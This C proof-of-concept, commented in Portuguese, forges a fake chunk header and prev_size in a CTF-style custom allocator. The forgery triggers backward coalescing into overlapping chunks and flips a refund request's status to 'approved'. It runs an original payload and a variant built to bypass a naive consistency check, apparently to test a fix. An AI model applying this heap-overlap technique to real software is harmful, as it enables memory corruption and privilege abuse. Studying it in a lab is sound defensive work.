/*
 * poc_causa_raiz.c -- o mesmo ataque do menu, mas ligado direto no allocator.
 *
 * Uso:
 *   ./poc_causa_raiz original
 *   ./poc_causa_raiz adaptado
 *
 * "original" reproduz o payload do exploit do repositorio (header falso 0x50,
 * prev_size 0xa8). "adaptado" e o payload que passa pela checagem ingenua de
 * auto-consistencia (header falso 0xb0, prev_size 0xb0).
 *
 * O programa nao decide se o ataque "deveria" funcionar: ele so imprime o que
 * aconteceu. O harness compara com a expectativa de cada build.
 */

#include <stdio.h>
#include <string.h>
#include <stdint.h>

#include "alloc.h"

typedef struct refund_request {
    int status;
    int amount;
    char reason[0x80];
} refund_request_t;

#define RR_CHUNK   0x90
#define CMPL_CHUNK 0x50
#define C3_OFF     0x120

static uint64_t p64(unsigned char *dst, uint64_t value) {
    memcpy(dst, &value, sizeof(value));
    return value;
}

int main(int argc, char **argv) {
    /*
     * O allocator usa sbrk() diretamente. Se o primeiro printf alocar o
     * buffer de stdio via malloc, o break do processo muda e os chunks
     * deixam de sair encostados. O main.c do desafio desabilita o buffer;
     * fazemos o mesmo aqui.
     */
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    int adaptado = (argc > 1 && strcmp(argv[1], "adaptado") == 0);

    size_t fake_hdr_off = adaptado ? 0x70 : 0x78;
    size_t fake_size = adaptado ? 0xb0 : 0x50;
    size_t forged_prev = C3_OFF - fake_hdr_off;

    refund_request_t *rr0 = (refund_request_t *) pwnymalloc(sizeof(refund_request_t));
    if (rr0 == NULL) {
        puts("ERRO: pwnymalloc(rr0) falhou");
        return 2;
    }

    char *base = (char *) rr0 - 8;
    char *reason0 = (char *) rr0 + 8;

    memset(rr0, 0, RR_CHUNK - 8);
    p64((unsigned char *) reason0 + (fake_hdr_off - 0x10), fake_size);

    refund_request_t *rr1 = (refund_request_t *) pwnymalloc(sizeof(refund_request_t));
    if (rr1 == NULL) {
        puts("ERRO: pwnymalloc(rr1) falhou");
        return 2;
    }

    char *reason1 = (char *) rr1 + 8;
    memset(rr1, 0, RR_CHUNK - 8);
    p64((unsigned char *) reason1 + 0x78, forged_prev);

    void *complaint = pwnymalloc(0x48);
    if (complaint == NULL) {
        puts("ERRO: pwnymalloc(complaint) falhou");
        return 2;
    }

    char *c3 = (char *) complaint - 8;
    if ((char *) rr1 - 8 != base + RR_CHUNK || c3 != base + C3_OFF) {
        printf("ERRO: layout inesperado (base=%p rr1_chunk=%p c3=%p)\n",
               (void *) base, (void *) ((char *) rr1 - 8), (void *) c3);
        return 2;
    }

    printf("[poc] base=%p rr0=%p rr1=%p complaint=%p\n",
           (void *) base, (void *) rr0, (void *) rr1, complaint);
    printf("[poc] variante=%s header_falso=%p size=%#zx prev_size=%#zx\n",
           adaptado ? "adaptado" : "original",
           (void *) (base + fake_hdr_off), fake_size, forged_prev);
    printf("[poc] esperado_merge=%#zx\n", CMPL_CHUNK + fake_size);

    /*
     * Dispara a coalescencia. O proprio allocator imprime "Block size: ...".
     */
    pwnyfree(complaint);

    /*
     * Se a sobreposicao nasceu, esta alocacao e servida de dentro do chunk
     * falso e cai sobre o RR1. Se nao nasceu, o allocator estende o heap.
     */
    refund_request_t *novo = (refund_request_t *) pwnymalloc(sizeof(refund_request_t));
    if (novo == NULL) {
        puts("ERRO: pwnymalloc(novo) falhou");
        return 2;
    }

    char *novo_chunk = (char *) novo - 8;
    int overlap = (novo_chunk >= base && novo_chunk < base + C3_OFF);

    int status = rr1->status;
    long off = 0;

    if (overlap) {
        char *novo_reason = (char *) novo + 8;
        off = (char *) &rr1->status - novo_reason;
        if (off >= 0 && off < (long) sizeof(rr1->reason)) {
            *(int *) (novo_reason + off) = 1;
        }
        status = rr1->status;
    }

    printf("[poc] novo_chunk=%p overlap=%s offset_status=%ld status_rr1=%d\n",
           (void *) novo_chunk, overlap ? "sim" : "nao", off, status);
    printf("RESULTADO: overlap=%s status_aprovado=%s\n",
           overlap ? "sim" : "nao", status == 1 ? "sim" : "nao");

    return 0;
}
